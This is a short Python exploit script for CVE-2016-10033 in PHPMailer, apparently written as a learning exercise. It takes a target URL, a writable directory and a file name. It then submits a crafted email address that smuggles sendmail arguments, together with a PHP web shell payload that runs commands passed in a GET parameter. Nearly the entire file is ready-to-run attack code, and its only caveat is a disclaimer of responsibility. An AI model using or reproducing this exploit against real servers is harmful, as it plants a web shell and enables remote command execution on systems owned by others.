#!/usr/bin/python3
#PHP Mailer : CVE-2016-10033
#Author: Spirited Wolf
#This exploit is not the orignal exploit, I wrote this just for the learning purpose.
#Usage: python3 phpmailer_exercise.py > and give the information like /var/www/html , url , spiritedwolf.php
#I am not responsible for any harm
from urllib import request, parse
import json

Writable_Directory = input("Enter the writeable directory:")

URL = input("Enter the url:")
filename = input("Enter the file name:")
email_address = """ "alright@whoami\\" -oQ/tmp/ -X%s/%s root"@whoami""" % (Writable_Directory , filename)

php_payload = """ <?php system($_GET['spirit']);?> """

post_data = { 'email' : email_address , 'subject' : 'none' , 'text' : php_payload }

post_data = parse.urlencode(post_data).encode()

req =  request.Request(URL , data=post_data)
response = request.urlopen(req)

print (response.read())
